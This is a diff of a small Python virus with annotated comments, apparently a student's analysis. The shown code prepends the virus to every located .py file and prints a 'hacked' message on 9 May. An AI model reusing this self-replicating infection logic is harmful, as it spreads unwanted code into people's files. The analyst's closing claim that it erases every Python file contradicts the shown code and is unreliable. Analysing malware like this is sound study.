@@ -32,13 +32,18 @@ def infect(files_targeted):                                   # Another function
         temp = f.read()                                       # reads the contents of the file into temp variable
         f.close()                                             # closes the file
         f = open(fname,"w")                                   # opens the file in write mode
-        f.write(virusstring + temp)                           # clears the file then writes the same data back into the file
+        f.write(virusstring + temp)                           # clears the file then writes the first 39 lines of this file to every .py
         f.close()                                             # closes the file
 
 def detonate():                                               # Declares the function detonate with no arguments
     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
-        print "You have been hacked"                          # Prints to the screen this message (although the syntax is incorrect)
+        print "You have been hacked"                          # Prints to the screen this message (although the syntax is incorrect) only if the date is 05/09
 
-files_targeted = locate(os.path.abspath(""))                  # 
+files_targeted = locate(os.path.abspath(""))                  # I'm not certain if files_targeted becomes
 infect(files_targeted)                                        # runs the infect function with the list as the argument
 detonate()                                                    # Runs the detonate function
+
+#Bottom line: This virus does not do what it says in the scenario. If syntactically correct, it would erase every python file and replace it with the first 39 lines of code
+#from this file
+#There are places where it becomes very confusing as to whether or not a variable is being used globally or where there is recursion.
+#I guess I'm just not sure what the intended outcome of this virus is.
